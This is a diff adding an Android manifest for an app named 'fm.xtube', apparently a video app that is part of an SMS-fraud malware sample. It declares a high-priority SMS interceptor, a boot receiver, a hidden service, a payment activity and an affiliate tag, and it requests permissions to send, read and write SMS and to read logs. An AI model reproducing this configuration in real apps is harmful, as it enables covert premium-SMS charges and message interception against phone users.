@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:debuggable="true" android:versionCode="1" android:versionName="1.0" package="fm.xtube">
+    <uses-sdk android:minSdkVersion="8"/>
+    <application android:theme="@style/Theme.NoTitleBar" android:label="@string/app_name" android:icon="@drawable/xtube">
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name="MainActivity" android:screenOrientation="portrait"/>
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name=".ListHDMoviesActivity" android:screenOrientation="portrait"/>
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name=".HdActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".VideoActivity" android:screenOrientation="landscape"/>
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name=".PayActivity" android:screenOrientation="portrait"/>
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name=".ListMoviesActivity" android:screenOrientation="portrait"/>
+        <activity android:theme="@style/Theme.NoTitleBar.Fullscreen" android:name="fm.xtube.CheckAgeActivity" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <meta-data android:name="sx.jolly.partner" android:value="_1888"/>
+        </activity>
+        <receiver android:name="sx.jolly.receivers.SMSReceiver">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="sx.jolly.receivers.RebootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="movie service" android:name="sx.jolly.core.JollyService" android:enabled="true">
+            <intent-filter>
+                <action android:name="sx.jolly.core.JollyService"/>
+            </intent-filter>
+        </service>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+</manifest>
